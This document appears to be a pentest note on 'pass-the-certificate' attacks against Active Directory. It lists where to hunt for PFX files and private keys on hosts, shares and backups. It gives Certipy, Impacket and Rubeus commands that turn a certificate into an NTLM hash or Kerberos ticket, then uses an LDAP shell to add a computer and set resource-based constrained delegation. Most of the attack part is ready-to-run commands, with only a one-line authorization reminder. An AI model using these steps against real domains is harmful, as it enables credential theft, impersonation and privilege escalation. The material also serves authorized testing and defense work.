**Pentest Note: Pass-the-Certificate**

---

### Finding Certificates in the Environment

Certificates, such as PFX files, can often be found in various locations within a corporate environment. Here are some common places to look for certificates:

#### Local Filesystems:

- **User Profiles:**
  - `C:\Users\<userne>\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates`
  - `C:\Users\<userne>\Documents\Certificates`

- **System Locations:**
  - `C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys`
  - `C:\ProgramData\Microsoft\Crypto\RSA\S-1-5-18`

#### Webservers:

- **Common Directories:**
  - `/etc/ssl/certs/` (Linux)
  - `/etc/pki/tls/certs/` (Linux)
  - `C:\inetpub\wwwroot\certs` (Windows IIS)
  - Look for configuration files like `web.config` or `applicationHost.config` for references to certificate files.

#### Corporate Environment:

- **Email Attachments:**
  - Look for certificates attached in emails, especially from IT departments.

- **Shared Network Drives:**
  - Browse shared network folders for `.pfx`, `.pem`, `.crt`, and other certificate file extensions.

- **Backup Locations:**
  - Check backup repositories for copies of certificates.

- **Configuration Management Systems:**
  - Systems like Ansible, Puppet, or SCCM may store certificates for deployment purposes.

### Requesting Certificates

To request a certificate within a corporate environment, you typically need to interact with the internal Certificate Authority (CA). Here are the common steps:

1. **Access the CA Web Interface:**
   - Open a browser and navigate to the CA web enrollment page (e.g., `http://<ca_server>/certsrv`).

2. **Request a Certificate:**
   - Log in with your domain credentials.
   - Select "Request a certificate" and follow the prompts to fill out the certificate request form.

3. **Using Certreq:**
   - **Generate a CSR (Certificate Signing Request):**
     ```bash
     certreq -new request.inf request.csr
     ```

   - **Submit the CSR to the CA:**
     ```bash
     certreq -submit request.csr certificate.cer
     ```

   - **Accept and Install the Certificate:**
     ```bash
     certreq -accept certificate.cer
     ```

4. **Using OpenSSL:**
   - **Generate a Private Key and CSR:**
     ```bash
     openssl req -new -newkey rsa:2048 -nodes -keyout mykey.key -out myrequest.csr
     ```

   - **Submit the CSR to the CA via the web interface or directly to the CA admin.**

5. **Automated Certificate Enrollment:**
   - Systems like Group Policy can be used to auto-enroll devices and users for certificates without manual intervention.

### Step 1: Get NTLM Hash from Certificate

Use Certipy to authenticate and obtain the NTLM hash from the certificate.

- **Certipy:**
  ```bash
  certipy auth -pfx <crt_file> -dc-ip <dc_ip>
  ```

### Step 2: Pass the Certificate

Use the certificate to authenticate and request Kerberos tickets.

#### Using PKINIT:

1. **Impacket:**

   - **Request TGT with PKINIT:**
     ```bash
     gettgtpkinit.py -cert-pfx "<pfx_file>" [-pfx-pass "<cert-password>"] "<fqdn_domain>/<user>" "<tgt_ccache_file>"
     ```

2. **Rubeus:**

   - **Request TGT with Rubeus:**
     ```powershell
     Rubeus.exe asktgt /user:"<userne>" /certificate:"<pfx_file>" [/password:"<certificate_password>"] /domain:"<fqdn-domain>" /dc:"<dc>" /show
     ```

3. **Certipy:**

   - **Authenticate with Certipy:**
     ```bash
     certipy auth -pfx <crt_file> -dc-ip <dc_ip>
     ```

#### Using Schannel:

1. **Certipy:**

   - **Authenticate and Open LDAP Shell:**
     ```bash
     certipy auth -pfx <crt_file> -ldap-shell
     ```

   - **Add Computer:**
     ```plaintext
     add_computer
     ```

   - **Set RBCD:**
     ```plaintext
     set_rbcd
     ```

---

These steps will guide you through using certificates to authenticate and request Kerberos tickets, leveraging PKINIT and Schannel methods. Always ensure your activities are authorized and comply with legal and ethical guidelines.